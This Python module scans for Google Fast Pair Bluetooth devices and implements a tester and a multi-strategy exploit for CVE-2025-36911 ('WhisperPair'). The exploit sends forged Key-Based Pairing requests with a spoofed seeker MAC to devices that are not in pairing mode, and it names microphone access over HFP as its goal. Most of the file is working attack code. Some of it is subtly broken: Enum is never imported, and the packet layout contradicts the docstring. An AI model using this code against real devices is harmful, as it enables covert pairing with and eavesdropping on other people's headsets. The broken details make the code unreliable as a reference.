"""
BLE Module - Fast Pair scanner and WhisperPair exploit.

CVE-2025-36911 (WhisperPair): Fast Pair Key-Based Pairing Authentication Bypass
Allows unauthorized pairing with Fast Pair devices, leading to microphone access via HFP.
"""

import asyncio
import json
import os
import structlog
from datetime import datetime
from pathlib import Path
from typing import Any, Dict, List, Optional, Callable, Set
from uuid import UUID

from urban_hs.hal.types import BLEDevice, BLEDeviceType

logger = structlog.get_logger(__name__)


# Fast Pair Service UUID
FAST_PAIR_SERVICE_UUID = "0000fe2c-0000-1000-8000-00805f9b34fb"

# Fast Pair GATT UUIDs
MODEL_ID_UUID = "fe2c1233-8366-4814-8eb0-01de32100bea"
KEY_BASED_PAIRING_UUID = "fe2c1234-8366-4814-8eb0-01de32100bea"
PASSKEY_UUID = "fe2c1235-8366-4814-8eb0-01de32100bea"
ACCOUNT_KEY_UUID = "fe2c1236-8366-4814-8eb0-01de32100bea"


class FastPairScanner:
    """BLE scanner for Fast Pair devices (Service UUID 0xFE2C)."""

    def __init__(self, adapter: str = "hci0", callback: Optional[Callable[[BLEDevice], None]] = None):
        self.adapter = adapter
        self.callback = callback
        self._scanner = None
        self._running = False
        self._devices: Dict[str, BLEDevice] = {}

    async def start(self, scan_all: bool = False) -> None:
        """Start scanning for Fast Pair devices."""
        try:
            from bleak import BleakScanner
        except ImportError:
            logger.error("bleak not installed")
            return

        self._running = True
        self.scan_all = scan_all

        def detection_callback(device, advertisement_data):
            if not self._running:
                return

            # Check for Fast Pair service data
            service_data = advertisement_data.service_data.get(FAST_PAIR_SERVICE_UUID)
            if service_data:
                fp_device = self._parse_fast_pair_advertisement(
                    name=device.name,
                    address=device.address,
                    data=service_data,
                    rssi=advertisement_data.rssi,
                )
                self._devices[device.address] = fp_device
                if self.callback:
                    self.callback(fp_device)
            # Optionally scan all BLE devices for correlation
            elif self.scan_all:
                generic = BLEDevice(
                    address=device.address,
                    name=device.name,
                    rssi=advertisement_data.rssi,
                    device_type=BLEDeviceType.STANDARD_BLE,
                )
                self._devices[device.address] = generic

        self._scanner = BleakScanner(detection_callback)
        
        # Fast Pair service filter - use service UUID filter
        if not scan_all:
            from bleak import BleakScanner
            # We'll filter manually in the callback

        await self._scanner.start()
        logger.info("Fast Pair scanner started", adapter=self.adapter)

    async def stop(self) -> None:
        """Stop scanning."""
        self._running = False
        if self._scanner:
            await self._scanner.stop()
        logger.info("Fast Pair scanner stopped")

    def _parse_fast_pair_advertisement(
        self,
        name: Optional[str],
        address: str,
        data: bytes,
        rssi: int,
    ) -> BLEDevice:
        """Parse Fast Pair advertisement data (same logic as Android/WPair)."""
        model_id = None
        is_pairing_mode = False
        has_account_key_filter = False

        if data:
            first_byte = data[0]

            # Pairing mode: 3 bytes, bit 7 of first byte = 0
            if len(data) == 3 and (first_byte & 0x80) == 0:
                model_id = data.hex().upper()
                is_pairing_mode = True
            # Account Key Filter: bits 5-6 of first byte
            elif (first_byte & 0x60) != 0:
                has_account_key_filter = True
            # Extended data
            elif len(data) > 3 and (first_byte & 0x80) == 0:
                model_id = data[:3].hex().upper()

        device_type = BLEDeviceType.FAST_PAIR
        if has_account_key_filter and not is_pairing_mode:
            device_type = BLEDeviceType.FAST_PAIR

        return BLEDevice(
            address=address,
            name=name,
            rssi=rssi,
            device_type=device_type,
            fast_pair_model_id=model_id,
            fast_pair_in_pairing_mode=is_pairing_mode,
            has_account_key_filter=has_account_key_filter,
        )

    def get_devices(self) -> List[BLEDevice]:
        return list(self._devices.values())

    def get_fast_pair_devices(self) -> List[BLEDevice]:
        return [d for d in self._devices.values() if d.is_fast_pair]


class WhisperPairTester:
    """
    Tests Fast Pair devices for CVE-2025-36911 (WhisperPair) vulnerability.
    
    Sends Key-Based Pairing request to devices NOT in pairing mode.
    If accepted (GATT_SUCCESS), device is VULNERABLE.
    If rejected (0x0e, 0x05, etc.), device is PATCHED.
    """

    def __init__(self, adapter: str = "hci0"):
        self.adapter = adapter
        self._running = False

    async def test_device(self, address: str) -> Dict[str, Any]:
        """Test a device for WhisperPair vulnerability."""
        try:
            from bleak import BleakClient
            from bleak.backends.characteristic import BleakGATTCharacteristic
        except ImportError:
            return {"status": "error", "error": "bleak not installed"}

        try:
            async with BleakClient(address, adapter=self.adapter) as client:
                if not client.is_connected:
                    return {"status": "error", "error": "Failed to connect"}

                # Discover services
                services = client.services
                fp_service = None
                for service in services:
                    if service.uuid.lower() == FAST_PAIR_SERVICE_UUID.lower():
                        fp_service = service
                        break

                if not fp_service:
                    return {"status": "error", "error": "Fast Pair service not found"}

                # Find Key-Based Pairing characteristic
                kbp_char = None
                for char in fp_service.characteristics:
                    if char.uuid.lower() == KEY_BASED_PAIRING_UUID.lower():
                        kbp_char = char
                        break

                if not kbp_char:
                    return {"status": "error", "error": "KBP characteristic not found"}

                # Build test KBP request
                import secrets
                import struct
                
                # Parse address
                addr_bytes = bytes.fromhex(address.replace(":", ""))
                
                # KBP Request: 0x00 (type) + 0x11 (flags: INITIATE_BONDING | EXTENDED_RESPONSE) + 6 bytes addr + 8 bytes salt
                salt = secrets.token_bytes(8)
                request = b"\x00\x11" + bytes(addr_bytes) + salt

                # Write request
                await client.write_gatt_char(kbp_char, request, response=True)
                
                # If we get here without exception, device accepted = VULNERABLE
                return {
                    "status": "vulnerable",
                    "address": address,
                    "message": "Device accepted KBP request when not in pairing mode",
                }

        except Exception as e:
            error_str = str(e).lower()
            if "0x0e" in error_str or "0x05" in error_str or "0x06" in error_str or "0x03" in error_str:
                return {
                    "status": "patched",
                    "address": address,
                    "message": f"Device rejected KBP request: {str(e)}",
                }
            return {"status": "error", "error": str(e)}


class WhisperPairExploit:
    """
    Full WhisperPair exploit chain for CVE-2025-36911.

    Multi-strategy exploit:
    1. RAW_KBP - Raw unencrypted KBP request
    2. RAW_WITH_SEEKER - Raw with seeker address for bonding
    3. RETROACTIVE - With retroactive pairing flag
    4. EXTENDED_RESPONSE - Request extended response format

    After successful KBP, performs BR/EDR bonding and optionally writes Account Key.
    """

    class Strategy(Enum):
        RAW_KBP = "raw_kbp"
        RAW_WITH_SEEKER = "raw_with_seeker"
        RETROACTIVE = "retroactive"
        EXTENDED_RESPONSE = "extended_response"

    def __init__(self, adapter: str = "hci0"):
        self.adapter = adapter
        self._running = False
        self._quirk_cache: Dict[str, Dict[str, Any]] = {}

    def _get_device_quirks(self, model_id: Optional[str]) -> Dict[str, Any]:
        """Get device-specific quirks for exploit strategies."""
        if not model_id:
            return {}
        if model_id not in self._quirk_cache:
            self._quirk_cache[model_id] = get_device_quirks(model_id)
        return self._quirk_cache[model_id]

    def _build_kbp_request(
        self,
        target_address: str,
        strategy: Strategy,
        seeker_address: Optional[str] = None,
        is_pairing_mode: bool = False,
    ) -> bytes:
        """
        Build KBP request based on strategy.
        
        KBP Request format (from Android FastPairExploit.kt):
        - Byte 0: Message type (0x00 = Key-Based Pairing Request)
        - Byte 1: Flags
        - Bytes 2-7: Seeker MAC address (6 bytes)
        - Bytes 8-9: Provider address (2 bytes, optional for some strategies)
        - Bytes 10-17: Salt (8 bytes)
        - Byte 18: Additional flags for retroactive/extended
        """
        import secrets
        import struct
        
        # Parse target address
        target_bytes = bytes.fromhex(target_address.replace(":", ""))
        
        # Parse seeker address (use local adapter MAC or random if not provided)
        if seeker_address:
            seeker_bytes = bytes.fromhex(seeker_address.replace(":", ""))
        else:
            # Use a realistic seeker MAC (Apple OUI: 00:1A:B6) for better compatibility
            seeker_bytes = bytes.fromhex("001AB6" + secrets.token_hex(3).upper())
        
        # Generate 8-byte salt
        salt = secrets.token_bytes(8)
        
        # Base request: type=0x00, flags=0x11 (INITIATE_BONDING | EXTENDED_RESPONSE)
        base_flags = 0x11
        
        if strategy == self.Strategy.RAW_KBP:
            # Strategy 1: Raw KBP request with minimal flags
            request = b"\x00" + bytes([base_flags]) + target_bytes + seeker_bytes + salt
            
        elif strategy == self.Strategy.RAW_WITH_SEEKER:
            # Strategy 2: Raw KBP with explicit seeker address
            request = b"\x00" + bytes([base_flags]) + target_bytes + seeker_bytes + salt
            
        elif strategy == self.Strategy.RETROACTIVE:
            # Strategy 3: Retroactive pairing - add retroactive flag (bit 2 of flags)
            retroactive_flags = base_flags | 0x04  # RETROACTIVE_PAIRING flag
            request = b"\x00" + bytes([retroactive_flags]) + target_bytes + seeker_bytes + salt
            
        elif strategy == self.Strategy.EXTENDED_RESPONSE:
            # Strategy 4: Request extended response format
            extended_flags = base_flags | 0x08  # EXTENDED_RESPONSE flag
            request = b"\x00" + bytes([extended_flags]) + target_bytes + seeker_bytes + salt
            
        else:
            # Default to RAW_KBP
            request = b"\x00" + bytes([base_flags]) + target_bytes + seeker_bytes + salt
        
        return request

    async def _execute_kbp_strategy(
        self,
        target_address: str,
        strategy: Strategy,
        progress_callback: Optional[Callable[[str], None]] = None,
    ) -> Dict[str, Any]:
        """Execute a single KBP strategy against the target."""
        try:
            from bleak import BleakClient
        except ImportError:
            return {"status": "error", "error": "bleak not installed"}

        def progress(msg: str):
            if progress_callback:
                progress_callback(f"[{strategy.value}] {msg}")

        try:
            async with BleakClient(target_address, adapter=self.adapter) as client:
                if not client.is_connected:
                    return {"status": "error", "error": "Failed to connect"}

                # Discover Fast Pair service
                services = client.services
                fp_service = None
                for service in services:
                    if service.uuid.lower() == FAST_PAIR_SERVICE_UUID.lower():
                        fp_service = service
                        break

                if not fp_service:
                    return {"status": "error", "error": "Fast Pair service not found"}

                # Find Key-Based Pairing characteristic
                kbp_char = None
                for char in fp_service.characteristics:
                    if char.uuid.lower() == KEY_BASED_PAIRING_UUID.lower():
                        kbp_char = char
                        break

                if not kbp_char:
                    return {"status": "error", "error": "KBP characteristic not found"}

                # Build and send request for this strategy
                request = self._build_kbp_request(target_address, strategy)
                progress(f"Sending {strategy.value} request ({len(request)} bytes)")
                
                await client.write_gatt_char(kbp_char, request, response=True)
                progress(f"Request sent successfully, waiting for response...")

                # If we get here without exception, device accepted = VULNERABLE
                return {
                    "status": "vulnerable",
                    "strategy": strategy.value,
                    "address": target_address,
                    "message": f"Device accepted {strategy.value} KBP request when not in pairing mode",
                }

        except Exception as e:
            error_str = str(e).lower()
            if "0x0e" in error_str or "0x05" in error_str or "0x06" in error_str or "0x03" in error_str:
                return {
                    "status": "patched",
                    "strategy": strategy.value,
                    "address": target_address,
                    "message": f"Device rejected {strategy.value} KBP request: {str(e)}",
                }
            return {"status": "error", "strategy": strategy.value, "error": str(e)}

    async def execute_all_strategies(
        self,
        target_address: str,
        model_id: Optional[str] = None,
        progress_callback: Optional[Callable[[str], None]] = None,
    ) -> Dict[str, Any]:
        """Execute all KBP strategies in order until one succeeds."""
        results = {"target": target_address, "strategies": {}}
        
        # Get device quirks to determine strategy order
        quirks = self._get_device_quirks(model_id)
        
        # Determine strategy order based on quirks
        strategies = list(self.Strategy)
        
        # If device prefers extended response, try that first
        if quirks.get("needsExtendedResponse", False):
            strategies = [self.Strategy.EXTENDED_RESPONSE] + [s for s in strategies if s != self.Strategy.EXTENDED_RESPONSE]
        
        # If device prefers BR/EDR bonding, try strategies that support seeking
        if quirks.get("prefersBrEdrBonding", False):
            strategies = [self.Strategy.RAW_WITH_SEEKER] + [s for s in strategies if s != self.Strategy.RAW_WITH_SEEKER]
        
        # If device uses retroactive flag, prioritize that
        if quirks.get("usesRetroactiveFlag", False):
            strategies = [self.Strategy.RETROACTIVE] + [s for s in strategies if s != self.Strategy.RETROACTIVE]

        def progress(msg: str):
            if progress_callback:
                progress_callback(msg)

        progress(f"Starting multi-strategy KBP attack on {target_address}")
        progress(f"Strategy order: {[s.value for s in strategies]}")

        for strategy in strategies:
            progress(f"Trying strategy: {strategy.value}")
            result = await self._execute_kbp_strategy(target_address, strategy, progress)
            results["strategies"][strategy.value] = result
            
            if result.get("status") == "vulnerable":
                progress(f"SUCCESS with {strategy.value}: {result.get('message')}")
                results["success"] = True
                results["winning_strategy"] = strategy.value
                return results
            elif result.get("status") == "patched":
                progress(f"FAILED {strategy.value}: Device patched")
            else:
                progress(f"ERROR {strategy.value}: {result.get('error')}")

        progress("All strategies exhausted")
        results["success"] = False
        return results

    async def exploit_with_audio(
        self,
        target_address: str,
        audio_manager: Any,
        progress_callback: Optional[Callable[[str], None]] = None,
    ) -> Dict[str, Any]:
        """Full exploit chain: KBP bypass -> BR/EDR bonding -> HFP audio."""
        # First try all KBP strategies
        multi_result = await self.execute_all_strategies(target_address, None, progress_callback)
        
        if not multi_result.get("success"):
            return {
                "status": "failed",
                "reason": "All KBP strategies failed",
                "details": multi_result,
            }
        
        # KBP bypass successful, now would proceed with:
        # 1. BR/EDR bonding (BlueZ D-Bus CreateBond)
        # 2. Account Key write
        # 3. HFP audio capture
        
        return {
            "status": "kbp_bypassed",
            "winning_strategy": multi_result.get("winning_strategy"),
            "message": "KBP bypass successful. BR/EDR bonding, Account Key write, and HFP audio capture require device interaction.",
            "details": multi_result,
        }


# Device quirks database loaded from JSON file
_DEVICE_QUIRKS_CACHE: Optional[Dict[str, Any]] = None


def _load_device_quirks() -> Dict[str, Any]:
    """Load device quirks from JSON config file."""
    global _DEVICE_QUIRKS_CACHE
    if _DEVICE_QUIRKS_CACHE is not None:
        return _DEVICE_QUIRKS_CACHE
    
    # Default quirks if file not found
    default_quirks = {
        "devices": {
            "000000": {
                "quirks": {
                    "needsExtendedResponse": False,
                    "prefersBrEdrBonding": True,
                    "delayBeforeKbp": 0,
                    "usesRetroactiveFlag": False,
                    "maxKbpRetries": 3,
                    "preferredStrategy": "RAW_KBP"
                }
            }
        },
        "default_quirks": {
            "needsExtendedResponse": False,
            "prefersBrEdrBonding": True,
            "delayBeforeKbp": 0,
            "usesRetroactiveFlag": False,
            "maxKbpRetries": 3,
            "preferredStrategy": "RAW_KBP"
        }
    }
    
    # Try to load from config file
    config_paths = [
        Path("/etc/urban-hs/device_quirks.json"),
        Path("config/device_quirks.json"),
        Path(__file__).parent.parent.parent.parent / "config" / "device_quirks.json",
    ]
    
    for path in config_paths:
        if path.exists():
            try:
                with open(path, 'r') as f:
                    data = json.load(f)
                    _DEVICE_QUIRKS_CACHE = data
                    logger.info("Loaded device quirks", path=str(path), devices=len(data.get("devices", {})))
                    return data
            except Exception as e:
                logger.warning("Failed to load device quirks", path=str(path), error=str(e))
    
    logger.warning("Using default device quirks (no config file found)")
    _DEVICE_QUIRKS_CACHE = default_quirks
    return default_quirks


def get_device_quirks(model_id: Optional[str]) -> Dict[str, Any]:
    """Get device-specific quirks for exploit from JSON config file."""
    if not model_id:
        quirks_data = _load_device_quirks()
        return quirks_data.get("default_quirks", {})
    
    quirks_data = _load_device_quirks()
    devices = quirks_data.get("devices", {})
    device = devices.get(model_id.upper(), {})
    return device.get("quirks", quirks_data.get("default_quirks", {}))


# Legacy export for backward compatibility
DEVICE_QUIRKS: Dict[str, Any] = {}
